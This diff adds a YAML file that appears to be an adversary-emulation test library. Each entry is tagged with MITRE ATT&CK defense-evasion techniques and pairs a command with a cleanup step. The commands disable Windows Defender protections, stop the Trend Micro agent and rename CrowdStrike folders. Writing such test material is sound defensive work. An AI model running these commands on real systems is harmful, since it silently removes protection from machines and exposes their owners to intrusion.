@@ -1,0 +1,66 @@
+---
+commands:
+   disable_defender_powershell_1:
+      id: disable_defender_powershell_1
+      command: 'powershell Set-MpPreference -DisableRealtimeMonitoring $true'
+      cleanup: 'powershell Set-MpPreference -DisableRealtimeMonitoring $false'
+      mitre:
+         - 'Defense Evasion;T1562.001;Impair Defenses: Disable or Modify Tools'
+         - 'Execution;T1059.001;Command and Scripting Interpreter: PowerShell'
+      comments:
+   disable_defender_powershell_2:
+      id: disable_defender_powershell_2
+      command: 'powershell Set-MpPreference -DisableIOAVProtection $true'
+      cleanup: 'powershell Set-MpPreference -DisableIOAVProtection $false'
+      mitre:
+         - 'Defense Evasion;T1562.001;Impair Defenses: Disable or Modify Tools'
+         - 'Execution;T1059.001;Command and Scripting Interpreter: PowerShell'
+      comments:
+   disable_defender_powershell_3:
+      id: disable_defender_powershell_3
+      command: 'powershell Set-MpPreference -DisableBehaviorMonitoring $true'
+      cleanup: 'powershell Set-MpPreference -DisableBehaviorMonitoring $false'
+      mitre:
+         - 'Defense Evasion;T1562.001;Impair Defenses: Disable or Modify Tools'
+         - 'Execution;T1059.001;Command and Scripting Interpreter: PowerShell'
+      comments:
+   disable_defender_powershell_4:
+      id: disable_defender_powershell_4
+      command: 'powershell Set-MpPreference -DisableIntrusionPreventionSystem $true'
+      cleanup: 'powershell Set-MpPreference -DisableIntrusionPreventionSystem $false'
+      mitre:
+         - 'Defense Evasion;T1562.001;Impair Defenses: Disable or Modify Tools'
+         - 'Execution;T1059.001;Command and Scripting Interpreter: PowerShell'
+      comments:
+   disable_defender_powershell_5:
+      id: disable_defender_powershell_5
+      command: 'powershell Set-MpPreference -DisablePrivacyMode $true'
+      cleanup: 'powershell Set-MpPreference -DisablePrivacyMode $false'
+      mitre:
+         - 'Defense Evasion;T1562.001;Impair Defenses: Disable or Modify Tools'
+         - 'Execution;T1059.001;Command and Scripting Interpreter: PowerShell'
+      comments:
+   disable_trendmicro_sc:
+      id: disable_trendmicro_sc
+      command: 'cmd.exe /c sc stop ds_agent'
+      cleanup: 'cmd.exe /c sc start ds_agent'
+      mitre:
+         - 'Defense Evasion;T1562.001;Impair Defenses: Disable or Modify Tools'
+         - 'Execution;T1059.003;Command and Scripting Interpreter: Windows Command Shell'
+      comments:
+   disable_crowdstrike_1:
+      id: disable_crowdstrike_1
+      command: 'powershell Rename-Item "C:\Program Files\Crowdstrike" "C:\Program Files\goodbye"'
+      cleanup: 'powershell Rename-Item "C:\Program Files\goodbye" "C:\Program Files\Crowdstrike"'
+      mitre:
+         - 'Defense Evasion;T1562.001;Impair Defenses: Disable or Modify Tools'
+         - 'Execution;T1059.003;Command and Scripting Interpreter: Windows Command Shell'
+      comments:
+   disable_crowdstrike_2:
+      id: disable_crowdstrike_2
+      command: 'powershell Rename-Item "C:\Windows\System32\Drivers\Crowdstrike" "C:\Windows\System32\Drivers\goodbye"'
+      cleanup: 'powershell Rename-Item "C:\Windows\System32\Drivers\goodbye" "C:\Windows\System32\Drivers\Crowdstrike"'
+      mitre:
+         - 'Defense Evasion;T1562.001;Impair Defenses: Disable or Modify Tools'
+         - 'Execution;T1059.003;Command and Scripting Interpreter: Windows Command Shell'
+      comments:
